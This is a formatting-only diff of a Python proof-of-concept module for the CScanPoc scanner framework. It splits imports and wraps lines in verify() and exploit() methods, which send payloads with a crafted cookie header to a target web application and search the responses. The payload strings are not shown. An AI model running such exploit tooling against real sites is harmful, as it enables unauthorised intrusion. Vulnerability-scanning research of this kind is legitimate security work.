@@ -2,8 +2,12 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request, urllib.parse, urllib.error
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.parse
+import urllib.error
+import urllib.request
+import urllib.error
+import urllib.parse
 import re
 
 
@@ -44,9 +48,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -57,7 +62,8 @@ class Poc(ABPoc):
             user_agent = {'Cookie': 'shoppingcart=a; username=a'}
             for payload in payloads:
                 verify_url = '{target}'.format(target=self.target)+payload
-                request = urllib.request.Request(verify_url, headers=user_agent)
+                request = urllib.request.Request(
+                    verify_url, headers=user_agent)
                 response = urllib.request.urlopen(request)
                 content = response.read()
                 results = re.findall(
@@ -70,7 +76,8 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                 target=self.target, vuln=self.vuln))
@@ -81,7 +88,8 @@ class Poc(ABPoc):
             user_agent = {'Cookie': 'shoppingcart=a; username=a'}
             for payload in payloads:
                 verify_url = '{target}'.format(target=self.target)+payload
-                request = urllib.request.Request(verify_url, headers=user_agent)
+                request = urllib.request.Request(
+                    verify_url, headers=user_agent)
                 response = urllib.request.urlopen(request)
                 content = response.read()
                 results = re.findall(
